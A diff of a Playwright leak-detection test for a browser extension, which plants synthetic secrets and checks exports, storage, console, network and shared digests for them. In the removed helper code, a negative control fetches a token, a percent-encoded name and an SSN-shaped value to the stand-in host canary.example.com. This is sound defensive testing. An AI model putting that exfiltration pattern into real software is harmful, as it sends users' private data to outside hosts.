@@ -18,7 +18,7 @@ import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 
-import { expect, type Page, test, type Worker } from '@playwright/test';
+import { expect, type Page, test } from '@playwright/test';
 import type { WxtBrowser } from 'wxt/browser';
 
 import { startFixtureServer } from '../tools/serve-fixtures';
@@ -35,8 +35,10 @@ import { launchExtension } from './support/extension';
 import { findLeaks, type Leak, loadSeeds, type Seed } from './support/leaks';
 import { netLogPathFor, readNetLogRequests } from './support/netlog';
 import { guardArgs, installRouteGuard, type RouteRecord } from './support/network-guard';
-import { pasteActivity, seededLog } from './support/paste';
+import { datedClock, pasteActivity, seededLog } from './support/paste';
 import { injectSeeds } from './support/seed-pages';
+import { plantInConsole, plantInDigest, plantInNetwork, plantInPage } from './support/leak-plants';
+import { readReceiptShares } from './support/share';
 import {
   FIXTURE_TIME_ZONE,
   fixtureUrl,
@@ -50,6 +52,11 @@ declare const chrome: WxtBrowser;
 const SEEDS = loadSeeds();
 const SEEDED_PAGES = ['_harness/blank.html', '_harness/mail-like.html', '_harness/calendar-like.html'];
 const EXTENSION_PAGES = ['popup.html', 'options.html', 'sidepanel.html'];
+
+/** A claim whose counterparty is a name written with a dot (security review SEC-1): stored, and never shared. */
+const DOTTED_NAME_LOG = ['Texted J.Smith that the deck is ready', datedClock(20, FIXTURE_TIME_ZONE)].join(
+  '\n',
+);
 /** Observer fixtures served as they are: each holds three seeds where real secrets sit (snippets, bodies, places). */
 const VENDOR_PAGES = [
   vendorFixture('gmail', 'synthetic-sent-page-1.html'),
@@ -198,108 +205,6 @@ async function plantInExtension(page: Page): Promise<void> {
   }, seed('email_body_1').value);
 }
 
-/** The negative control's plants into a page the extension reads: its web storage, IndexedDB and cookie. */
-async function plantInPage(page: Page): Promise<void> {
-  const values = ['phone_number', 'street_address', 'card_shape', 'email_local_part'].map(
-    (id) => seed(id).value,
-  );
-  await page.evaluate(async ([local, session, idb, cookie]) => {
-    localStorage.setItem('probe', local ?? '');
-    sessionStorage.setItem('probe', session ?? '');
-    document.cookie = `probe=${cookie ?? ''}`;
-    await new Promise<void>((resolve, reject) => {
-      const open = indexedDB.open('probe', 1);
-      open.onupgradeneeded = () => open.result.createObjectStore('s');
-      open.onsuccess = () => {
-        const tx = open.result.transaction('s', 'readwrite');
-        tx.objectStore('s').put(idb, 'k');
-        tx.oncomplete = () => {
-          open.result.close();
-          resolve();
-        };
-      };
-      open.onerror = () => {
-        reject(new Error('page probe open failed'));
-      };
-    });
-  }, values);
-}
-
-/** The negative control's plants into console output, from the service worker: one plain, one base64-encoded. */
-async function plantInConsole(worker: Worker): Promise<void> {
-  await worker.evaluate(
-    ([body, phrase]) => {
-      console.info(body);
-      console.info(btoa(phrase));
-    },
-    [seed('email_body_2').value, seed('passphrase').value] as const,
-  );
-}
-
-/**
- * The negative control's plants into the network, from an extension page: a token in a URL, a name
- * percent-encoded character by character, an SSN in a body.
- */
-async function plantInNetwork(page: Page): Promise<void> {
-  await page.evaluate(
-    ([token, name, ssn]) => {
-      const encoded = Array.from(name, (c) => `%${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
-      return Promise.all([
-        fetch(`https://canary.example.com/?q=${token}`).catch(() => undefined),
-        fetch(`https://canary.example.com/?n=${encoded}`).catch(() => undefined),
-        fetch('https://canary.example.com/', { method: 'POST', body: ssn }).catch(() => undefined),
-      ]);
-    },
-    [seed('url_with_token').value, seed('person_name_2').value, seed('ssn_shape').value] as const,
-  );
-}
-
-/**
- * The negative control's plant into the share: a digest whose notable receipt's hint is a seed, stored behind the
- * ledger's back, so the share the digest page makes holds it, markdown-escaped (the seed has a hyphen).
- */
-async function plantInDigest(page: Page): Promise<void> {
-  const digest = {
-    week: '2026-10-05',
-    from: '2026-10-05T00:00:00.000-04:00',
-    to: '2026-10-12T00:00:00.000-04:00',
-    createdAt: '2026-10-12T09:00:00.000-04:00',
-    agents: [],
-    notable: [
-      {
-        receiptId: '01JA0000000000000000000001',
-        agent: 'muse',
-        grade: 'NOT_FOUND',
-        subjectHint: seed('person_name_2').value,
-      },
-    ],
-    notableCount: 1,
-    gaps: [],
-    health: [],
-  };
-  await page.evaluate(
-    (row) =>
-      new Promise<void>((resolve, reject) => {
-        const open = indexedDB.open('attest');
-        open.onsuccess = () => {
-          const tx = open.result.transaction('digests', 'readwrite');
-          tx.objectStore('digests').put(row);
-          tx.oncomplete = () => {
-            open.result.close();
-            resolve();
-          };
-          tx.onerror = () => {
-            reject(new Error('the digest was not planted'));
-          };
-        };
-        open.onerror = () => {
-          reject(new Error('the ledger did not open'));
-        };
-      }),
-    digest,
-  );
-}
-
 /** Every plant the negative control makes, as `channel:seedId`: the collectors must catch each one. */
 const PLANTED = [
   'chrome-storage:api_key_openai_shape',
@@ -342,19 +247,27 @@ async function seededSession({ extension, seededUrl }: SessionContext): Promise<
   expect(await pasteActivity(panel, 'Muse', seededLog(SEEDS, FIXTURE_TIME_ZONE))).toMatch(
     /^Imported 3 claims\.$/u,
   );
+  // A name written with a dot is kept as its claim's counterparty, and never shared, as a domain or at all (SEC-1).
+  const dotted = await extension.openExtensionPage('sidepanel.html');
+  expect(await pasteActivity(dotted, 'Muse', DOTTED_NAME_LOG)).toBe('Imported 1 claim.');
   await new Promise((resolve) => setTimeout(resolve, SETTLE_MS));
-  // The week's digest, made by its alarm with the clock advanced, and its share as it would be copied (4.7).
+  // The week's digest, made by its alarm with the clock advanced, and its share as it would be copied (4.7), then
+  // each receipt's share as it would be copied (4.8).
   await makeDigestNow(extension, await extension.openExtensionPage('options.html'));
-  return [(await readShare(extension)).share];
+  return [(await readShare(extension)).share, ...(await readReceiptShares(extension))];
 }
 
 test.describe('no seeded secret leaks', { tag: '@mandatory' }, () => {
   test('seeded pages leave no trace in export, IndexedDB, storage, console, or network', async () => {
     test.setTimeout(3 * 60_000);
     const collected = await collectAfter(seededSession);
-    // The share was read, and holds no counterparty beyond its domain: no address at all.
-    expect(collected.share.join('\n')).toContain('# Attest weekly digest');
-    expect(collected.share.join('\n')).not.toMatch(/@/u);
+    // Every share was read, the week's and each receipt's, and holds no counterparty beyond its domain: no address at
+    // all, and no name, even one written with a dot.
+    const shared = collected.share.join('\n');
+    expect(shared).toContain('# Attest weekly digest');
+    expect(shared.split('# Attest receipt:').length - 1).toBeGreaterThanOrEqual(4 * 2);
+    expect(shared).not.toMatch(/@/u);
+    expect(shared.toLowerCase()).not.toContain('j.smith');
 
     // Every channel was actually read: an unreadable channel must never pass as "no leaks".
     expect(collected.storage.ledgerExport).toMatchObject({
